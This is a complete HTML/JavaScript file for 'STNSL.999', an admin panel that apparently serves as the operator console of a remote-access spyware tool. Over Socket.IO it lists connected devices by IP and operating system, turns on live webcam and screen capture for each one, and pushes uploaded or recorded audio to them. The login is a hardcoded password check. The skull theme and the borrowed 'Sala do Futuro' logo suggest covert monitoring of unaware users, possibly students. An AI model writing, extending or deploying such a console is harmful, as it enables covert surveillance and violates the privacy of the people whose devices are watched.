<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>STNSL.999 – Admin</title>

<!-- Bootstrap & FontAwesome -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

<style>
/* Minimal-Hacker Soft v1.1  ─────────────────────────────────── */
:root{
  --bg-1:#0e131a; --bg-2:#161c24; --stroke:#1f2731;
  --text:#d0d5dc; --muted:#8a94a3; --brand:#3ddcff;
  --radius:.6rem; --shadow:0 8px 24px -12px rgba(0,0,0,.6);
  --mono:'Fira Code',Consolas,Menlo,monospace;
}
html,body{height:100%;margin:0;font-family:var(--mono);background:var(--bg-1);color:var(--text);-webkit-font-smoothing:antialiased;}
body.locked{overflow:hidden}
*::-webkit-scrollbar{width:6px;height:6px}
*::-webkit-scrollbar-thumb{background:var(--brand);border-radius:3px}
.navbar{background:var(--bg-2);border-bottom:1px solid var(--stroke);padding:.75rem 1.25rem;box-shadow:var(--shadow);}
.sidebar{background:var(--bg-2);width:240px;border-right:1px solid var(--stroke);overflow-y:auto;transition:width .25s;}
.sidebar.collapsed{width:68px}
.brand{padding:1.5rem 1rem .75rem;border-bottom:1px solid var(--stroke);text-align:center;}
.brand img{max-height:52px}
.list-group-item{display:flex;align-items:center;gap:.75rem;padding:.55rem .85rem;margin:.15rem .75rem;font-size:.9rem;font-weight:500;color:var(--muted);border-radius:calc(var(--radius) - .25rem);cursor:pointer;transition:background .15s,color .15s;}
.list-group-item i{width:22px;text-align:center}
.list-group-item:hover{background:rgba(61,220,255,.08);color:var(--text);}
.list-group-item.active{background:rgba(61,220,255,.18);color:var(--brand);}
#viewer{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:1.2rem;padding:1.5rem;}
.card-feed{position:relative;background:var(--bg-2);border:1px solid var(--stroke);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:transform .2s,box-shadow .2s;}
.card-feed:hover{transform:translateY(-4px);box-shadow:0 16px 28px -12px rgba(61,220,255,.25);}
.card-feed img{display:block;width:100%;height:170px;object-fit:cover;filter:brightness(.92);}
.card-feed .overlay{position:absolute;top:.4rem;left:.5rem;padding:.2rem .6rem;font-size:.75rem;background:rgba(0,0,0,.65);color:#fff;border-radius:.3rem;text-transform:uppercase;letter-spacing:.04em;}
.card-feed .btn-bar{position:absolute;right:.6rem;bottom:.6rem;display:flex;gap:.4rem;}
.btn-glass{width:34px;height:34px;display:inline-flex;align-items:center;justify-content:center;background:rgba(61,220,255,.1);border:1px solid rgba(61,220,255,.28);color:var(--brand);border-radius:50%;backdrop-filter:blur(3px);transition:background .15s,border .15s;}
.btn-glass:hover{background:rgba(61,220,255,.18);border-color:rgba(61,220,255,.45);}
@keyframes glow{0%,100%{text-shadow:0 0 4px var(--brand)}50%{text-shadow:0 0 8px var(--brand)}}
.flashing-title{animation:glow 1.6s infinite alternate;font-weight:700;}
#login{display:flex;align-items:center;justify-content:center;height:100vh;}
.login-card{width:320px;background:var(--bg-2);border:1px solid var(--stroke);border-radius:var(--radius);box-shadow:var(--shadow);padding:2rem 2.25rem;}
.login-card input{width:100%;background:var(--bg-1);border:1px solid var(--stroke);border-radius:.4rem;padding:.5rem .75rem;color:var(--text);font-family:var(--mono);font-size:.9rem;outline:none;transition:border-color .2s;}
.login-card input:focus{border-color:var(--brand)}
#splash{position:fixed;inset:0;display:none;flex-direction:column;align-items:center;justify-content:center;background:#000;color:var(--brand);z-index:9999;}
#splash .skull{font-size:64px;animation:glow 2s infinite}
</style>
</head>

<body class="locked">
<!-- Splash ------------------------------------------------ -->
<div id="splash">
  <div class="skull"><i class="fas fa-skull"></i></div>
  <div class="text">STNSL.999 starting …</div>
</div>

<!-- Login ------------------------------------------------- -->
<div id="login">
  <div class="login-card w-100" style="max-width:420px">
    <h4 class="mb-3 flashing-title"><i class="fas fa-lock"></i> Acesso Restrito</h4>
    <input id="user" class="form-control mb-3" placeholder="Usuário">
    <input id="pass" type="password" class="form-control mb-3" placeholder="Senha">
    <button class="btn btn-primary w-100" onclick="login()">Entrar</button>
    <div id="error" class="text-danger mt-3 d-none">Usuário ou senha incorretos</div>
  </div>
</div>

<!-- Painel ------------------------------------------------ -->
<div id="painel" style="display:none;height:100vh">
  <nav class="navbar px-3 flex-shrink-0 justify-content-between">
    <span class="fw-semibold"><i class="fas fa-video-camera me-2"></i>Painel • STNSL.999</span>
    <div class="d-flex align-items-center gap-2">
      <button id="themeToggle" class="btn btn-glass" title="Alternar tema"><i id="themeIcon" class="fas fa-moon"></i></button>
      <div class="dropdown">
        <button class="btn btn-glass" data-bs-toggle="dropdown"><i class="fas fa-ellipsis-v"></i></button>
        <ul class="dropdown-menu dropdown-menu-end shadow">
          <li><a class="dropdown-item" href="https://manus.im/" target="_blank">MANUS.IM (teste)</a></li>
          <li><a class="dropdown-item" href="https://pastebin.com/raw/mNtFVJJa" target="_blank">Infos script</a></li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="d-flex" style="height:calc(100% - 56px)">
    <!-- Sidebar -->
    <aside class="sidebar p-3">
      <div class="brand"><img src="https://i.imgur.com/At4HFM0.png" alt="Sala do Futuro"></div>
      <h6 class="fw-semibold mt-4">Dispositivos <span id="count" class="badge bg-primary">0</span></h6>
      <ul id="list" class="list-group list-group-flush small mt-2"></ul>
    </aside>

    <!-- Viewer -->
    <main class="flex-grow-1 p-4 overflow-auto">
      <div id="viewer" class="d-flex flex-wrap"></div>
    </main>
  </div>
</div>

<!-- Modal gravar áudio ------------------------------------ -->
<div class="modal fade" id="recordModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header border-0">
        <h5 class="modal-title">Gravar áudio</h5>
        <button class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body text-center">
        <button id="recordBtn" class="btn btn-danger"><i class="fas fa-microphone"></i> Gravar</button>
        <button id="stopBtn" class="btn btn-secondary d-none"><i class="fas fa-stop"></i> Parar</button>
      </div>
      <p class="small text-center text-muted mb-3">O áudio será enviado automaticamente após a gravação.</p>
    </div>
  </div>
</div>

<!-- Toasts -->
<div class="toast-container position-fixed top-0 end-0 p-3"></div>

<!-- Scripts ----------------------------------------------- -->
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
/* ── Elementos DOM / Estado ─────────────────────────────── */
const socket  = io({ query:{ role:'admin' } });
const listEl  = document.getElementById('list');
const countEl = document.getElementById('count');
const viewer  = document.getElementById('viewer');
const toastBox= document.querySelector('.toast-container');
const recordModal = new bootstrap.Modal('#recordModal');
const recordBtn   = document.getElementById('recordBtn');
const stopBtn     = document.getElementById('stopBtn');

const cache={}, activeCam={}, activeScreen={};
let currentTargetUUID=null, mediaRecorder,chunks=[];

/* ── Tema claro/escuro ───────────────────────────────────── */
const themeBtn=document.getElementById('themeToggle');
const themeIcon=document.getElementById('themeIcon');
function updateIcon(){themeIcon.className=document.documentElement.classList.contains('dark')?'fas fa-sun':'fas fa-moon';}
themeBtn.onclick=()=>{document.documentElement.classList.toggle('dark');
                      localStorage.setItem('prefersDark',document.documentElement.classList.contains('dark'));updateIcon();}
if(localStorage.getItem('prefersDark')==='true'){document.documentElement.classList.add('dark');updateIcon();}

/* ── Login simples ───────────────────────────────────────── */
function login(){
  const u=document.getElementById('user').value.trim();
  const p=document.getElementById('pass').value.trim();
  if(u==='admin'&&p==='0312'){
    document.body.classList.remove('locked');
    document.getElementById('login').style.display='none';
    document.getElementById('splash').style.display='flex';
    setTimeout(()=>{document.getElementById('splash').style.display='none';
                    document.getElementById('painel').style.display='block';},1400);
  }else document.getElementById('error').classList.remove('d-none');
}

/* ── Utilidades ──────────────────────────────────────────── */
function toast(msg,type='primary'){
  const t=document.createElement('div');
  t.className=`toast align-items-center text-white bg-${type} border-0`;
  t.innerHTML=`<div class="d-flex"><div class="toast-body">${msg}</div>
               <button class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div>`;
  toastBox.appendChild(t); bootstrap.Toast.getOrCreateInstance(t,{delay:2500}).show();
  t.addEventListener('hidden.bs.toast',()=>t.remove());
}
const os = ua => /Windows NT/.test(ua)?'Windows':/Mac OS X/.test(ua)?'macOS':/Android/.test(ua)?'Android':/iPhone|iPad/.test(ua)?'iOS':/Linux/.test(ua)?'Linux':'—';
const infoPopoverContent = c => `<strong>UUID:</strong> ${c.uuid}<br><strong>OS:</strong> ${os(c.ua)}<br><strong>Conectado:</strong> ${new Date(c.connected_at).toLocaleString()}`;

/* ── Fullscreen helper ───────────────────────────────────── */
function openFullScreen(card){
  const img=card.querySelector('img');
  const onFs=()=>{if(document.fullscreenElement===card){img.style.width='100vw';img.style.height='100vh';img.style.objectFit='contain';}
                  else{img.style.width='';img.style.height='';img.style.objectFit='cover';document.removeEventListener('fullscreenchange',onFs);}};
  document.addEventListener('fullscreenchange',onFs);
  (card.requestFullscreen||card.webkitRequestFullscreen||card.msRequestFullscreen).call(card);
}

/* ── Criar card viewer ───────────────────────────────────── */
function mkCard(uuid,type){
  const c=cache[uuid];
  const card=document.createElement('div');
  card.className='card-feed'; card.id=`${type}-${uuid}`;
  card.innerHTML=`
     <div class="overlay">${c.ip} • ${type==='cam'?'Câmera':'Tela'}</div>
     <img id="${type==='cam'?'img':'screen-img'}-${uuid}">
     <div class="btn-bar">
       <button class="btn btn-glass btn-full"><i class="fas fa-expand"></i></button>
       <button class="btn btn-glass btn-stop"><i class="fas fa-xmark"></i></button>
     </div>`;
  card.querySelector('.btn-full').onclick=()=>openFullScreen(card);
  card.querySelector('.btn-stop').onclick=()=>{
    socket.emit(type==='cam'?'stop-stream':'stop-screen',uuid);
    (type==='cam'?activeCam:activeScreen)[uuid]=undefined;
    card.remove();
  };
  viewer.appendChild(card);
}

/* ── Linha sidebar ───────────────────────────────────────── */
function row(c){return `<li class="list-group-item" data-uuid="${c.uuid}">
  <i class="fas fa-eye"></i><span>${c.ip}</span>
  <div class="dropdown ms-auto">
    <button class="btn btn-glass btn-sm" data-bs-toggle="dropdown"><i class="fas fa-ellipsis-v"></i></button>
    <ul class="dropdown-menu dropdown-menu-end shadow">
      <li><a class="dropdown-item toggle-cam" data-uuid="${c.uuid}"><i class="fas fa-video me-2"></i>Câmera</a></li>
      <li><a class="dropdown-item toggle-screen" data-uuid="${c.uuid}"><i class="fas fa-desktop me-2"></i>Tela</a></li>
      <li><hr class="dropdown-divider"></li>
      <li><a class="dropdown-item download-audio" href="https://pixabay.com/sound-effects/" target="_blank">
          <i class="fas fa-arrow-down me-2"></i>Baixar áudio</a></li>
      <li><a class="dropdown-item stop-audio" data-uuid="${c.uuid}">
          <i class="fas fa-volume-xmark me-2"></i>Parar áudio</a></li>
      <li><label class="dropdown-item"><i class="fas fa-upload me-2"></i>Enviar áudio
          <input type="file" accept="audio/*" class="audio-file d-none" data-uuid="${c.uuid}"></label></li>
      <li><a class="dropdown-item record-audio" data-uuid="${c.uuid}">
          <i class="fas fa-microphone-lines me-2"></i>Gravar & enviar</a></li>
    </ul>
  </div>
</li>`;}

/* ── Socket.IO ───────────────────────────────────────────── */
socket.on('clients', arr=>{
  countEl.textContent=arr.length;
  listEl.innerHTML=''; arr.forEach(c=>{cache[c.uuid]=c;listEl.insertAdjacentHTML('beforeend',row(c));});
  document.querySelectorAll('.fa-eye').forEach(btn=>{
    const uuid=btn.closest('[data-uuid]').dataset.uuid;
    bootstrap.Popover.getOrCreateInstance(btn,{trigger:'focus',placement:'right',html:true,
      content:()=>infoPopoverContent(cache[uuid])});
  });
});
socket.on('frame',({id,data})=>{const img=document.getElementById('img-'+id);if(img&&activeCam[id])img.src=data;});
socket.on('screen-frame',({id,data})=>{const img=document.getElementById('screen-img-'+id);if(img&&activeScreen[id])img.src=data;});

/* ── Ações na sidebar ───────────────────────────────────── */
listEl.addEventListener('click',e=>{
  const uuid=e.target.closest('[data-uuid]')?.dataset.uuid; if(!uuid)return;
  if(e.target.closest('.toggle-cam')){
    if(activeCam[uuid]){socket.emit('stop-stream',uuid);delete activeCam[uuid];document.getElementById('cam-'+uuid)?.remove();toast('Câmera parada','secondary');}
    else{socket.emit('request-stream',uuid);activeCam[uuid]=true;mkCard(uuid,'cam');toast('Câmera ativada','primary');}
  }
  if(e.target.closest('.toggle-screen')){
    if(activeScreen[uuid]){socket.emit('stop-screen',uuid);delete activeScreen[uuid];document.getElementById('screen-'+uuid)?.remove();toast('Tela parada','secondary');}
    else{socket.emit('request-screen',uuid);activeScreen[uuid]=true;mkCard(uuid,'screen');toast('Tela ativada','primary');}
  }
  if(e.target.closest('.stop-audio')){socket.emit('stop-audio',uuid);toast('Áudio parado','secondary');}
  if(e.target.closest('.record-audio')){currentTargetUUID=uuid;recordModal.show();}
});

/* upload de áudio ----------------------------------------- */
listEl.addEventListener('change',e=>{
  if(e.target.classList.contains('audio-file')){
    const uuid=e.target.dataset.uuid, f=e.target.files[0]; if(!f)return;
    const fr=new FileReader(); fr.onload=()=>{socket.emit('custom-audio',{uuid,dataURL:fr.result});toast('Áudio enviado','info');}; fr.readAsDataURL(f);
  }
});

/* gravação de áudio --------------------------------------- */
recordBtn.onclick=async()=>{
  const stream=await navigator.mediaDevices.getUserMedia({audio:true});
  mediaRecorder=new MediaRecorder(stream);chunks=[];
  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
  mediaRecorder.onstop=()=>{
    const blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();
    fr.onload=()=>{socket.emit('custom-audio',{uuid:currentTargetUUID,dataURL:fr.result});
                  toast('Áudio gravado/enviado','success');recordModal.hide();};
    fr.readAsDataURL(blob);
  };
  mediaRecorder.start(); recordBtn.classList.add('d-none'); stopBtn.classList.remove('d-none');
};
stopBtn.onclick=()=>{mediaRecorder?.stop();recordBtn.classList.remove('d-none');stopBtn.classList.add('d-none');};
</script>
</body>
</html>
